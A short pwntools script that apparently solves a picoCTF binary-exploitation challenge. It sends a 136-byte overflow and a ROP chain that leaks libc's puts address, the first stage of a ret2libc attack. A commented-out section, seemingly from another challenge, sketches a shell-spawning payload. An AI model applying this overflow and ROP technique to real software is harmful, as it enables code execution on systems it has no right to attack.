#!/bin/python3
from pwn import *
io = remote("mercury.picoctf.net", 23584)

libc = ELF('./libc.so.6')
exe = ELF('./vuln')

# 0x0000000000400913 : pop rdi ; ret
# offset 136
payload = b'A' *136
pop_rdi = 0x400913
pop_rsi = 0x023e8a
pop_rdx = 0x001b96
offset  = libc.symbols['puts']
io.recvuntil(b'sErVeR!\n')
payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])
io.sendline(payload)
io.recvline()

# io.recvuntil("(e)xit\n")
# io.sendline("s")

# address = io.recvline()
# address = address.split(b"...")[1]
# address = address[:-1]
# print(address)
# # payload = fit({
# #     56: "/bin/sh"
# # })

# io.recvuntil("(e)xit\n")
# io.sendline("i")
# io.recvuntil("(Y/N)?")
# io.sendline("y")
# io.recvuntil("(e)xit\n")
# io.sendline("l")
# payload = fit({
#     0: 0x080487d6
# })
# io.recvuntil("try anyways:")
# io.sendline(payload)


# # io.sendline(payload)
# io.interactive()
